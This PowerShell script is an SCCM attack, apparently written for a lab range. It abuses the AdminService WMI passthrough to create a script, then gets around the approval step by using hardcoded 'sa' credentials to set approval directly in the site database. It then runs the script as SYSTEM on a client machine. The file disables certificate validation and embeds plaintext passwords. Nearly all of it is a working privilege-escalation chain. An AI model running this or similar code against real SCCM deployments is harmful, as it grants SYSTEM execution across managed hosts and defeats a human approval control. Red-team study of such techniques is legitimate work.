# WT039: Script exec as SYSTEM via AdminService wmi passthrough (SCCMHunter method) — analyst_t1 (ws01 ATTACK)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy14 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy14
$mp = 'mbr02.range.local'
$resourceId = 16777220   # WS01
$cred = New-Object System.Management.Automation.PSCredential('range\svc_sccm', (ConvertTo-SecureString 's3rv1c3_SCCM!' -AsPlainText -Force))
$base = "https://$mp/AdminService"
$guid = [guid]::NewGuid().ToString()
Remove-Item -LiteralPath 'C:\Windows\Temp\wt039-marker.txt','C:\Windows\Temp\wt039-system.txt' -ErrorAction SilentlyContinue

# Script content (runs as SYSTEM on client) + UTF-16LE BOM + base64
$script = "whoami > C:\Windows\Temp\wt039-system.txt`necho WT039-PROOF-SYSTEM-EXEC > C:\Windows\Temp\wt039-marker.txt`nwhoami"
$bom = [byte[]](0xFF,0xFE)
$bytes = [Text.Encoding]::Unicode.GetBytes($script)
$all = $bom + $bytes
$scriptBody = [Convert]::ToBase64String($all)

Write-Output "=== WT039 via AdminService wmi passthrough (guid=$guid) ==="

# 1. CreateScripts
Write-Output '[1] POST /AdminService/wmi/SMS_Scripts.CreateScripts/'
$createBody = @{
  ApprovalState = 3
  ParamsDefinition = ''
  ScriptName = 'WT039-SYSTEM-Proof'
  Author = 'RANGE\svc_sccm'
  Script = $scriptBody
  ScriptVersion = '1'
  ScriptType = 0
  ParameterlistXML = ''
  ScriptGuid = $guid
} | ConvertTo-Json
try {
  $r1 = Invoke-RestMethod -Uri "$base/wmi/SMS_Scripts.CreateScripts/" -Method Post -Body $createBody -ContentType 'application/json' -Credential $cred -TimeoutSec 30
  Write-Output ("    created: " + ($r1 | ConvertTo-Json -Compress -Depth 3))
} catch {
  $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
  Write-Output ("    ERROR " + $code + " : " + $_.Exception.Message)
  if ($_.ErrorDetails) { Write-Output ("    detail: " + $_.ErrorDetails.Message) }
  exit 1
}

# 2. Approve
Write-Output '[2] POST UpdateApprovalState'
$appBody = @{ Approver = ''; ApprovalState = '3'; Comment = '' } | ConvertTo-Json
try {
  $r2 = Invoke-RestMethod -Uri "$base/wmi/SMS_Scripts/$guid/AdminService.UpdateApprovalState" -Method Post -Body $appBody -ContentType 'application/json' -Credential $cred -TimeoutSec 30
  Write-Output ("    approved: " + ($r2 | ConvertTo-Json -Compress))
} catch {
  $code = 0; if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
  Write-Output ("    approve ERROR " + $code + " : " + $_.Exception.Message)
}

# 2b. Author cannot self-approve (500). Same DB primitive as validated WT039.
Write-Output '[2b] SQL UPDATE Scripts SET ApprovalState=3'
try {
  $builder = New-Object System.Data.SqlClient.SqlConnectionStringBuilder
  $builder['Data Source'] = 'mbr02.range.local,1433'
  $builder['Initial Catalog'] = 'CM_CAD'
  $builder['User ID'] = 'sa'
  $builder['Password'] = 's@_P@ssw0rd!L@b!'
  $builder['Encrypt'] = $false
  $builder['TrustServerCertificate'] = $true
  $builder['Connect Timeout'] = 8
  $sql = New-Object System.Data.SqlClient.SqlConnection $builder.ConnectionString
  $sql.Open()
  $cmd = $sql.CreateCommand()
  $cmd.CommandText = 'UPDATE Scripts SET ApprovalState=3 WHERE ScriptGuid=@g'
  [void]$cmd.Parameters.AddWithValue('@g', $guid)
  $n = $cmd.ExecuteNonQuery()
  $sql.Close()
  Write-Output ("    DB rows=$n guid=$guid")
} catch {
  Write-Output ("    DB approve ERROR: " + $_.Exception.Message)
}

# 3. Run script on WS01
Write-Output '[3] POST RunScript'
$runBody = @{ ScriptGuid = $guid } | ConvertTo-Json
try {
  $r3 = Invoke-RestMethod -Uri "$base/v1.0/Device($resourceId)/AdminService.RunScript" -Method Post -Body $runBody -ContentType 'application/json' -Credential $cred -TimeoutSec 30
} catch {
  Write-Output ("    RunScript ERROR: " + $_.Exception.Message)
  if ($_.ErrorDetails) { Write-Output ("    detail: " + $_.ErrorDetails.Message) }
  Write-Output 'T039_FAIL'
  exit 1
}
$opId = $r3.value
Write-Output ("    OperationId=" + $opId)

# 4. Poll ScriptResult (often 404 even when the client ran). Also watch on-disk markers.
Write-Output '[4] Poll ScriptResult + local SYSTEM markers'
$done = $false
for ($i = 1; $i -le 24; $i++) {
  Start-Sleep -Seconds 5
  foreach ($marker in @('C:\Windows\Temp\wt039-marker.txt', 'C:\Windows\Temp\wt039-system.txt')) {
    if (Test-Path -LiteralPath $marker -ErrorAction SilentlyContinue) {
      Write-Output ("[+] local marker " + $marker)
      Get-Content -LiteralPath $marker -ErrorAction SilentlyContinue
      $done = $true
    }
  }
  if ($done) { break }
  try {
    $pr = Invoke-RestMethod -Uri "$base/v1.0/Device($resourceId)/AdminService.ScriptResult(OperationId=$opId)" -Credential $cred -TimeoutSec 15
    $result = $pr.value.Result
    if ($result) {
      Write-Output ("[+] Result ready (attempt " + $i + ")")
      $pr | ConvertTo-Json -Depth 6
      $done = $true
      break
    }
    Write-Output ("    attempt " + $i + ": no result yet")
  } catch {
    Write-Output ("    attempt " + $i + ": " + $_.Exception.Message)
  }
}
if (-not $done) { Write-Output '[!] Timed out polling'; Write-Output 'T039_FAIL'; exit 1 }
Write-Output ("WT039_DONE guid=" + $guid + " op=" + $opId)
Write-Output 'T039_OK'
